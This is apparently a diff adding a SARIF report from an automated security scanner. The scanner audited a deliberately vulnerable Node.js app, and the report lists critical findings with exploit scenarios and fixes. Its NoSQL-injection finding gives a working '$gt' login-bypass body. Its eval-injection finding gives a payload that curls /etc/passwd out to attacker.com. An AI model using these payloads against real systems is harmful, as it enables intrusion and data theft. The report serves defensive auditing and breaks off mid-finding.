@@ -1,0 +1,2217 @@
+{
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Agentic SAST",
+          "version": "1.3.0",
+          "rules": [
+            {
+              "id": "CWE-307",
+              "name": "CWE-307"
+            },
+            {
+              "id": "CWE-319: Cleartext Transmission of Sensitive Information",
+              "name": "CWE-319: Cleartext Transmission of Sensitive Information",
+              "shortDescription": {
+                "text": "Cleartext Transmission of Sensitive Information"
+              }
+            },
+            {
+              "id": "CWE-943",
+              "name": "CWE-943"
+            },
+            {
+              "id": "CWE-1104: Use of Unmaintained Third Party Components",
+              "name": "CWE-1104: Use of Unmaintained Third Party Components",
+              "shortDescription": {
+                "text": "Use of Unmaintained Third Party Components"
+              }
+            },
+            {
+              "id": "CWE-306: Missing Authentication for Critical Function",
+              "name": "CWE-306: Missing Authentication for Critical Function",
+              "shortDescription": {
+                "text": "Missing Authentication for Critical Function"
+              }
+            },
+            {
+              "id": "CWE-798: Use of Hard-coded Credentials",
+              "name": "CWE-798: Use of Hard-coded Credentials",
+              "shortDescription": {
+                "text": "Use of Hard-coded Credentials"
+              }
+            },
+            {
+              "id": "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)",
+              "name": "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)",
+              "shortDescription": {
+                "text": "Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)"
+              }
+            },
+            {
+              "id": "CWE-256",
+              "name": "CWE-256"
+            },
+            {
+              "id": "CWE-918: Server-Side Request Forgery (SSRF)",
+              "name": "CWE-918: Server-Side Request Forgery (SSRF)",
+              "shortDescription": {
+                "text": "Server-Side Request Forgery (SSRF)"
+              }
+            },
+            {
+              "id": "CWE-494",
+              "name": "CWE-494"
+            },
+            {
+              "id": "CWE-384: Session Fixation",
+              "name": "CWE-384: Session Fixation",
+              "shortDescription": {
+                "text": "Session Fixation"
+              }
+            },
+            {
+              "id": "CWE-614",
+              "name": "CWE-614"
+            },
+            {
+              "id": "CWE-601: URL Redirection to Untrusted Site (Open Redirect)",
+              "name": "CWE-601: URL Redirection to Untrusted Site (Open Redirect)",
+              "shortDescription": {
+                "text": "URL Redirection to Untrusted Site (Open Redirect)"
+              }
+            },
+            {
+              "id": "CWE-862: Missing Authorization",
+              "name": "CWE-862: Missing Authorization",
+              "shortDescription": {
+                "text": "Missing Authorization"
+              }
+            },
+            {
+              "id": "CWE-639: Authorization Bypass Through User-Controlled Key",
+              "name": "CWE-639: Authorization Bypass Through User-Controlled Key",
+              "shortDescription": {
+                "text": "Authorization Bypass Through User-Controlled Key"
+              }
+            },
+            {
+              "id": "CWE-204",
+              "name": "CWE-204"
+            },
+            {
+              "id": "CWE-521",
+              "name": "CWE-521"
+            },
+            {
+              "id": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
+              "name": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
+              "shortDescription": {
+                "text": "Exposure of Sensitive Information to an Unauthorized Actor"
+              }
+            },
+            {
+              "id": "CWE-117",
+              "name": "CWE-117"
+            },
+            {
+              "id": "CWE-1333: Inefficient Regular Expression Complexity",
+              "name": "CWE-1333: Inefficient Regular Expression Complexity",
+              "shortDescription": {
+                "text": "Inefficient Regular Expression Complexity"
+              }
+            },
+            {
+              "id": "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)",
+              "name": "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)",
+              "shortDescription": {
+                "text": "Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)"
+              }
+            },
+            {
+              "id": "CWE-352: Cross-Site Request Forgery (CSRF)",
+              "name": "CWE-352: Cross-Site Request Forgery (CSRF)",
+              "shortDescription": {
+                "text": "Cross-Site Request Forgery (CSRF)"
+              }
+            },
+            {
+              "id": "CWE-209: Generation of Error Message Containing Sensitive Information",
+              "name": "CWE-209: Generation of Error Message Containing Sensitive Information",
+              "shortDescription": {
+                "text": "Generation of Error Message Containing Sensitive Information"
+              }
+            },
+            {
+              "id": "CWE-208",
+              "name": "CWE-208"
+            }
+          ],
+          "supportedTaxonomies": [
+            {
+              "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+            }
+          ]
+        }
+      },
+      "taxonomies": [
+        {
+          "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3",
+          "name": "CWE",
+          "organization": "MITRE",
+          "shortDescription": {
+            "text": "The MITRE Common Weakness Enumeration"
+          },
+          "informationUri": "https://cwe.mitre.org/",
+          "taxa": [
+            {
+              "id": "CWE-79",
+              "helpUri": "https://cwe.mitre.org/data/definitions/79.html",
+              "name": "Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)",
+              "shortDescription": {
+                "text": "Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)"
+              }
+            },
+            {
+              "id": "CWE-95",
+              "helpUri": "https://cwe.mitre.org/data/definitions/95.html",
+              "name": "Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)",
+              "shortDescription": {
+                "text": "Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)"
+              }
+            },
+            {
+              "id": "CWE-117",
+              "helpUri": "https://cwe.mitre.org/data/definitions/117.html"
+            },
+            {
+              "id": "CWE-200",
+              "helpUri": "https://cwe.mitre.org/data/definitions/200.html",
+              "name": "Exposure of Sensitive Information to an Unauthorized Actor",
+              "shortDescription": {
+                "text": "Exposure of Sensitive Information to an Unauthorized Actor"
+              }
+            },
+            {
+              "id": "CWE-204",
+              "helpUri": "https://cwe.mitre.org/data/definitions/204.html"
+            },
+            {
+              "id": "CWE-208",
+              "helpUri": "https://cwe.mitre.org/data/definitions/208.html"
+            },
+            {
+              "id": "CWE-209",
+              "helpUri": "https://cwe.mitre.org/data/definitions/209.html",
+              "name": "Generation of Error Message Containing Sensitive Information",
+              "shortDescription": {
+                "text": "Generation of Error Message Containing Sensitive Information"
+              }
+            },
+            {
+              "id": "CWE-256",
+              "helpUri": "https://cwe.mitre.org/data/definitions/256.html"
+            },
+            {
+              "id": "CWE-306",
+              "helpUri": "https://cwe.mitre.org/data/definitions/306.html",
+              "name": "Missing Authentication for Critical Function",
+              "shortDescription": {
+                "text": "Missing Authentication for Critical Function"
+              }
+            },
+            {
+              "id": "CWE-307",
+              "helpUri": "https://cwe.mitre.org/data/definitions/307.html"
+            },
+            {
+              "id": "CWE-319",
+              "helpUri": "https://cwe.mitre.org/data/definitions/319.html",
+              "name": "Cleartext Transmission of Sensitive Information",
+              "shortDescription": {
+                "text": "Cleartext Transmission of Sensitive Information"
+              }
+            },
+            {
+              "id": "CWE-352",
+              "helpUri": "https://cwe.mitre.org/data/definitions/352.html",
+              "name": "Cross-Site Request Forgery (CSRF)",
+              "shortDescription": {
+                "text": "Cross-Site Request Forgery (CSRF)"
+              }
+            },
+            {
+              "id": "CWE-384",
+              "helpUri": "https://cwe.mitre.org/data/definitions/384.html",
+              "name": "Session Fixation",
+              "shortDescription": {
+                "text": "Session Fixation"
+              }
+            },
+            {
+              "id": "CWE-494",
+              "helpUri": "https://cwe.mitre.org/data/definitions/494.html"
+            },
+            {
+              "id": "CWE-521",
+              "helpUri": "https://cwe.mitre.org/data/definitions/521.html"
+            },
+            {
+              "id": "CWE-601",
+              "helpUri": "https://cwe.mitre.org/data/definitions/601.html",
+              "name": "URL Redirection to Untrusted Site (Open Redirect)",
+              "shortDescription": {
+                "text": "URL Redirection to Untrusted Site (Open Redirect)"
+              }
+            },
+            {
+              "id": "CWE-614",
+              "helpUri": "https://cwe.mitre.org/data/definitions/614.html"
+            },
+            {
+              "id": "CWE-639",
+              "helpUri": "https://cwe.mitre.org/data/definitions/639.html",
+              "name": "Authorization Bypass Through User-Controlled Key",
+              "shortDescription": {
+                "text": "Authorization Bypass Through User-Controlled Key"
+              }
+            },
+            {
+              "id": "CWE-798",
+              "helpUri": "https://cwe.mitre.org/data/definitions/798.html",
+              "name": "Use of Hard-coded Credentials",
+              "shortDescription": {
+                "text": "Use of Hard-coded Credentials"
+              }
+            },
+            {
+              "id": "CWE-862",
+              "helpUri": "https://cwe.mitre.org/data/definitions/862.html",
+              "name": "Missing Authorization",
+              "shortDescription": {
+                "text": "Missing Authorization"
+              }
+            },
+            {
+              "id": "CWE-918",
+              "helpUri": "https://cwe.mitre.org/data/definitions/918.html",
+              "name": "Server-Side Request Forgery (SSRF)",
+              "shortDescription": {
+                "text": "Server-Side Request Forgery (SSRF)"
+              }
+            },
+            {
+              "id": "CWE-943",
+              "helpUri": "https://cwe.mitre.org/data/definitions/943.html"
+            },
+            {
+              "id": "CWE-1104",
+              "helpUri": "https://cwe.mitre.org/data/definitions/1104.html",
+              "name": "Use of Unmaintained Third Party Components",
+              "shortDescription": {
+                "text": "Use of Unmaintained Third Party Components"
+              }
+            },
+            {
+              "id": "CWE-1333",
+              "helpUri": "https://cwe.mitre.org/data/definitions/1333.html",
+              "name": "Inefficient Regular Expression Complexity",
+              "shortDescription": {
+                "text": "Inefficient Regular Expression Complexity"
+              }
+            }
+          ]
+        }
+      ],
+      "properties": {
+        "applicationId": "",
+        "scanDegraded": false,
+        "unrankedFallback": false
+      },
+      "results": [
+        {
+          "ruleId": "CWE-307",
+          "level": "error",
+          "message": {
+            "text": "Missing rate limiting on login endpoint  [CVSS 9.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/session.js"
+                },
+                "region": {
+                  "startLine": 53
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "critical",
+            "security-severity": "9.1",
+            "cvssRating": "Critical",
+            "category": "CWE-307",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+            "cwe": "CWE-307",
+            "cweId": "CWE-307",
+            "cvssScore": 9.1,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "#### Description\nThe handleLoginRequest function directly processes login attempts from req.body without any rate limiting, account lockout, CAPTCHA, or delay mechanism. No middleware or logic restricts the number of attempts per IP address, user account, or time window, allowing exhaustive password guessing.\n\n#### Impact\nAn unauthenticated attacker can send unlimited login attempts without any throttling, enabling brute-force and credential-stuffing attacks against user accounts. Successful guessing leads to unauthorized access to accounts and their associated PII.\n\n#### Exploit scenario\nAn attacker sends repeated POST requests to /login with a known username (e.g., admin) and different passwords from a wordlist. Because there is no lockout or rate limiting, the attacker can try thousands of passwords per minute until the correct one is found.\n\n#### Preconditions\n- Attacker has network access to the login page\n- Attacker knows a valid username (or can enumerate usernames via error messages)\n\n```\nthis.handleLoginRequest = (req, res, next) => {\n    const { userName, password } = req.body;\n    userDAO.validateLogin(userName, password, (err, user) => {\n        ...\n    });\n};\n```\n\n#### How to fix\nImplement rate limiting on the login route using a middleware like express-rate-limit, or add account lockout after N consecutive failed attempts. The check should be placed before the call to userDAO.validateLogin on line 58.\n\n**Exploitability:** Missing rate limiting on login endpoint allows unlimited brute-force attempts against user credentials. Combined with weak passwords (6) and username enumeration (5/7) yields full account takeover.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 No rate limiting, account lockout, CAPTCHA, or delay exists anywhere in the login flow; `POST /login` is directly exposed without middleware; distinct error messages additionally enable username enumeration to accelerate brute-force attacks."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-307"
+            }
+          ],
+          "rank": 91.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_5812a403e68d98ab40c5439b0929680e"
+          }
+        },
+        {
+          "ruleId": "CWE-319: Cleartext Transmission of Sensitive Information",
+          "level": "error",
+          "message": {
+            "text": "Server uses HTTP exposing sensitive data in cleartext  [CVSS 9.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 145
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "critical",
+            "security-severity": "9.1",
+            "cvssRating": "Critical",
+            "category": "CWE-319: Cleartext Transmission of Sensitive Information",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+            "cwe": "CWE-319 - Cleartext Transmission of Sensitive Information",
+            "cweId": "CWE-319",
+            "cweName": "Cleartext Transmission of Sensitive Information",
+            "cvssScore": 9.1,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "#### Description\nThe server is started with http.createServer(app) at line 145, with HTTPS alternative commented out. The application handles authentication and sensitive user data (SSN, bank accounts) that will be transmitted in plaintext over the network.\n\n#### Impact\nAll communication between the client and server is unencrypted, allowing network eavesdroppers to intercept sensitive data such as login credentials, session cookies, and PII. This can lead to mass credential theft and session hijacking.\n\n#### Exploit scenario\nAn attacker on the same WiFi network as a user performs a man-in-the-middle attack and captures the session cookie from an HTTP request. The attacker then replays the cookie to impersonate the user and access their private data.\n\n#### Preconditions\n- Attacker has network position to sniff traffic\n- Victim accesses the application over HTTP\n\n```\nhttp.createServer(app).listen(port, () => {\n    console.log(`Express http server listening on port ${port}`);\n});\n```\n\n#### How to fix\nEnable the HTTPS server using the certificates and set up proper TLS. Use `https.createServer` instead of `http.createServer`, and redirect HTTP to HTTPS.\n\n**Exploitability:** Server uses plain HTTP; credentials, session tokens, and all sensitive data are transmitted in cleartext, enabling passive eavesdropping.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 HTTP server with no TLS; session cookies, passwords, SSN, bank details all in cleartext; no upstream proxy termination."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-319"
+            }
+          ],
+          "rank": 91.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_d9725ede73a299754c5fd85f554bbb6c"
+          }
+        },
+        {
+          "ruleId": "CWE-943",
+          "level": "error",
+          "message": {
+            "text": "NoSQL Injection in Login via UserName  [CVSS 9.8: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/data/user-dao.js"
+                },
+                "region": {
+                  "startLine": 92
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "critical",
+            "security-severity": "9.8",
+            "cvssRating": "Critical",
+            "category": "CWE-943",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "cwe": "CWE-943",
+            "cweId": "CWE-943",
+            "cvssScore": 9.8,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.93,
+            "description": "#### Description\nIn session.js handleLoginRequest (line 55), `userName` is extracted from `req.body` and passed to `userDAO.validateLogin()`. Inside user-dao.js (line 92), that value is used directly in `usersCol.findOne({ userName: userName })` without any type checking or sanitization. If `userName` is an object (e.g., from a JSON\u2011encoded request), MongoDB interprets it as a query operator, allowing the attacker to match any user in the collection. The password comparison then uses the plaintext password from the matched user; an attacker who knows a common plaintext password can log in as that user without knowing the username.\n\n#### Impact\nThe login handler passes the user\u2011supplied userName directly into a MongoDB `findOne` query without sanitization. An attacker can send a JSON object as `userName` containing MongoDB operators (e.g., `{\"$gt\": \"\"}`) to bypass the username lookup, causing the query to match an arbitrary user. When combined with the known plaintext password of that user, this allows full authentication bypass without knowing the target username.\n\n#### Exploit scenario\nSend a POST request to `/login` with `Content-Type: application/json` and body `{\"userName\": {\"$gt\": \"\"}, \"password\": \"user1\"}`. The query `{ userName: { \"$gt\": \"\" } }` matches any user with a string userName. The first result (e.g., the admin account) is returned. If the attacker knows the password for that account (e.g., the default password 'user1' for the default 'user1' account), the comparison succeeds and the attacker is logged in as that user\u2014gaining admin privileges if the matched user is an administrator.\n\n#### Preconditions\n- Attacker must know or guess at least one plaintext password of any user (trivial due to weak passwords and plaintext storage)\n- Application accepts JSON\u2011encoded request bodies (default for Express body\u2011parser)\n\n```\nusersCol.findOne({\n    userName: userName\n}, validateUserDoc);\n```\n\n#### How to fix\nSanitize all query parameters to ensure they are strings before using them in MongoDB queries. Use `$eq` explicitly or type\u2011check inputs: `usersCol.findOne({ userName: { $eq: String(userName) } })` or validate that `userName` is a string early in `handleLoginRequest`.\n\n**Exploitability:** NoSQL injection in login allows bypassing authentication without knowing a username. Exploitable pre-auth by sending a crafted JSON body, immediately granting a session as an arbitrary user.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 userName flows from req.body through bodyParser.json() directly into usersCol.findOne() with no typeof check, sanitization, or schema validation; MongoDB native driver interprets object payloads as query operators; confirmed route is unauthenticated POST /login with no middleware defenses."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-943"
+            }
+          ],
+          "rank": 98.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_c7877d63a00859a526564b4a007d03ed"
+          }
+        },
+        {
+          "ruleId": "CWE-1104: Use of Unmaintained Third Party Components",
+          "level": "error",
+          "message": {
+            "text": "EOL Node.js 12 in Docker base image  [CVSS 9.8: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "Dockerfile"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "critical",
+            "security-severity": "9.8",
+            "cvssRating": "Critical",
+            "category": "CWE-1104: Use of Unmaintained Third Party Components",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "cwe": "CWE-1104 - Use of Unmaintained Third Party Components",
+            "cweId": "CWE-1104",
+            "cweName": "Use of Unmaintained Third Party Components",
+            "cvssScore": 9.8,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.95,
+            "description": "#### Description\nThe Dockerfile uses `FROM node:12-alpine` at line 1 (first stage) and again at line 7 (second stage). Node.js 12 is no longer maintained, exposing any deployed instance to all publicly known Node.js 12 CVEs. The image is not pinned by digest, so future pulls are also unpinned.\n\n#### Impact\nThe application is built on Node.js 12, which reached end-of-life in April 2022 and no longer receives security patches. Remote attackers can exploit known unpatched vulnerabilities in the runtime to execute arbitrary code or cause a denial of service, compromising the entire application server.\n\n#### Exploit scenario\nAn attacker sends a crafted HTTP request that triggers a known Node.js 12 vulnerability (e.g., path traversal or prototype pollution). Because the runtime is unpatched, the request achieves remote code execution on the container, allowing the attacker to steal data, pivot to internal services, or mine cryptocurrency.\n\n#### Preconditions\n- The application is deployed and accessible over the network.\n- A remotely exploitable vulnerability exists in Node.js 12 (many are known and unpatched).\n\n```\nFROM node:12-alpine\n```\n\n#### How to fix\nUpgrade the base image to a supported LTS version such as node:18-alpine or node:20-alpine. Pin the image by digest (e.g., node:20-alpine@sha256:...) to ensure immutable, known-good base layers.\n\n**Exploitability:** Docker base image uses end-of-life Node.js 12, exposing the application to all unpatched CVEs. No deploy-time control mitigates this supply-chain risk.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 9/10) \u2014 Dockerfile confirmed to use EOL node:12-alpine, built via docker-compose, network-exposed on port 4000, no digest pin or alternative image"
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-1104"
+            }
+          ],
+          "rank": 98.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_49bb2411950043c95b37beaeda70af70"
+          }
+        },
+        {
+          "ruleId": "CWE-306: Missing Authentication for Critical Function",
+          "level": "error",
+          "message": {
+            "text": "Missing authentication on MongoDB  [CVSS 9.9: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "docker-compose.yml"
+                },
+                "region": {
+                  "startLine": 8
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "critical",
+            "security-severity": "9.9",
+            "cvssRating": "Critical",
+            "category": "CWE-306: Missing Authentication for Critical Function",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+            "cwe": "CWE-306 - Missing Authentication for Critical Function",
+            "cweId": "CWE-306",
+            "cweName": "Missing Authentication for Critical Function",
+            "cvssScore": 9.9,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.85,
+            "description": "#### Description\nThe docker-compose.yml sets the connection string to `mongodb://mongo:27017/nodegoat` without credentials, and the mongo service does not define any authentication environment variables (e.g., MONGO_INITDB_ROOT_USERNAME). As a result, the database starts with no access controls, allowing any process on the Docker network to read/write all data.\n\n#### Impact\nThe MongoDB instance is configured without any authentication. An attacker who gains code execution inside the web container can directly access and exfiltrate all stored data, including user passwords, SSNs, and other PII, without needing additional credentials.\n\n#### Exploit scenario\nA remote attacker exploits the Server-Side JavaScript Injection (eval) in contributions to execute arbitrary commands. From the container, they use the mongo client to connect to mongo:27017 with no authentication. They can then dump the entire nodegoat database, including hashed (or plaintext) passwords and personally identifiable information.\n\n#### Preconditions\n- The attacker must achieve code execution inside the web container (e.g., via the known eval injection).\n\n```\nMONGODB_URI: mongodb://mongo:27017/nodegoat\n```\n\n#### How to fix\nSet up MongoDB authentication by adding environment variables to the mongo service in docker-compose.yml: MONGO_INITDB_ROOT_USERNAME and MONGO_INITDB_ROOT_PASSWORD. Update the MONGODB_URI to include the credentials, e.g., mongodb://admin:[REDACTED-URL-CRED]@mongo:27017/nodegoat?authSource=admin.\n\n**Exploitability:** MongoDB started with no authentication; any network-level actor inside the Docker network can read/write the entire database. Exploitable via SSRF (17) from an authenticated session.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 9/10) \u2014 docker-compose.yml configures MongoDB with zero authentication; the mongo service lacks MONGO_INITDB_ROOT_USERNAME/--auth; an attacker who gains RCE via the eval() injection in contributions (reachable from open signup) can connect from the web container to mongo:27017 without credentials and dump/modify all data, including plaintext passwords and PII."
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-306"
+            }
+          ],
+          "rank": 99.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_fb430d5898e77796f56732285bfe65b4"
+          }
+        },
+        {
+          "ruleId": "CWE-798: Use of Hard-coded Credentials",
+          "level": "error",
+          "message": {
+            "text": "Hardcoded session secret in config  [CVSS 9.8: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "config/env/all.js"
+                },
+                "region": {
+                  "startLine": 8
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "critical",
+            "security-severity": "9.8",
+            "cvssRating": "Critical",
+            "category": "CWE-798: Use of Hard-coded Credentials",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "cwe": "CWE-798 - Use of Hard-coded Credentials",
+            "cweId": "CWE-798",
+            "cweName": "Use of Hard-coded Credentials",
+            "cvssScore": 9.8,
+            "offensivePriority": "P4",
+            "offensivePriorityLabel": "Code-Knowledge / Insider Dependent",
+            "offensivePriorityReason": "Code-Knowledge / Insider Dependent | *requires source-code / insider knowledge*",
+            "confidence": 0.95,
+            "description": "#### Description\nThe cookieSecret configuration value is a static string in config/env/all.js and is used as the express-session secret. This allows anyone with access to the repository to sign arbitrary session cookies, bypassing authentication entirely.\n\n#### Impact\nAn attacker who obtains the hardcoded session secret from the source code can forge valid session cookies for any user, including administrators, leading to complete account takeover and data breach.\n\n#### Exploit scenario\nAn attacker reads the publicly available source code to obtain the cookieSecret. They then craft a session cookie containing a desired userId and the correct signature. Sending this cookie to the application grants them access as that user, including admin privileges.\n\n#### Preconditions\n- Attacker can view the source code (public repository or leaked config).\n\n```\ncookieSecret: \"[REDACTED-SECRET]\"\n```\n\n#### How to fix\nReplace the hardcoded secret with a value loaded from an environment variable or a secure secret management service. Remove the default value from the config file.\n\n**Exploitability:** Hardcoded session secret in config enables anyone with repository access to forge valid session cookies, completely bypassing authentication.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 9/10) \u2014 Hardcoded session secret in config/env/all.js flows through config/config.js into express-session middleware in server.js, with no environment-variable override in any deployment profile (production.js is empty). Anyone reading the public repo can forge session cookies for any user including admin.**"
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-798"
+            }
+          ],
+          "rank": 98.0,
+          "partialFingerprints": {
+            "vvaFindingId/v1": "vvaf1_a7b948191baa9faf345c62d8932aa2d3"
+          }
+        },
+        {
+          "ruleId": "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)",
+          "level": "error",
+          "message": {
+            "text": "Eval injection via contributions update handler  [CVSS 8.8: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H]"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/index.js"
+                },
+                "region": {
+                  "startLine": 50
+                }
+              }
+            }
+          ],
+          "properties": {
+            "severity": "high",
+            "security-severity": "8.8",
+            "cvssRating": "High",
+            "category": "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)",
+            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+            "cwe": "CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)",
+            "cweId": "CWE-95",
+            "cweName": "Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)",
+            "cvssScore": 8.8,
+            "offensivePriority": "P3",
+            "offensivePriorityLabel": "Internal Network / Privileged Position",
+            "offensivePriorityReason": "Internal Network / Privileged Position | *exposure unverified \u2014 no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*",
+            "confidence": 0.92,
+            "description": "*2 additional call site(s) collapsed during dedup \u2014 same root cause; each location needs the same fix applied.*\n\n#### Description\nThe POST /contributions route invokes handleContributionsUpdate, which (based on the codebase threat model) uses eval() on user-supplied contribution data without validation. An attacker can submit a form field containing JavaScript code (e.g., 'preTax: require('child_process').exec('malicious command')') which gets executed in the Node.js server context.\n\n#### Impact\nAuthenticated users can execute arbitrary JavaScript on the server by injecting malicious code into the pre-tax contribution amount field. This allows complete server compromise, data theft, and lateral movement within the infrastructure.\n\n#### Exploit scenario\nAuthenticated attacker submits POST /contributions with body {preTax: '1; require(\"child_process\").execSync(\"curl http://attacker.com/$(cat /etc/passwd)\")'} resulting in code execution and data exfiltration from the server.\n\n#### Preconditions\n- Attacker must be authenticated with any valid user account\n\n```\napp.get(\"/contributions\", isLoggedIn, contributionsHandler.displayContributions);\napp.post(\"/contributions\", isLoggedIn, contributionsHandler.handleContributionsUpdate);\n```\n\n#### How to fix\nRemove eval() usage entirely. Parse and validate numeric input using safe parsing functions. Never execute user-supplied strings as code.\n\n**Exploitability:** Eval injection in contributions handler; authenticated low-privilege user can execute arbitrary code on the server. Post-auth but reachable via any session.\n\n#### Adversarial verification\n**Verdict:** TRUE_POSITIVE (confidence: 10/10) \u2014 eval() on unsanitized req.body fields confirmed at contributions.js:32-34, reachable via POST /contributions behind the minimal isLoggedIn gate",
+            "dedupRelatedLocationCount": 2
+          },
+          "taxa": [
+            {
+              "toolComponent": {
+                "name": "CWE",
+                "guid": "b7c8d9e0-1f2a-3b4c-5d6e-7f8090a1b2c3"
+              },
+              "id": "CWE-95"
+            }
+          ],
+          "relatedLocations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/routes/contributions.js"
+                },
+                "region": {
+                  "startLine": 32,
+                  "endLine": 34
+                }
+              },
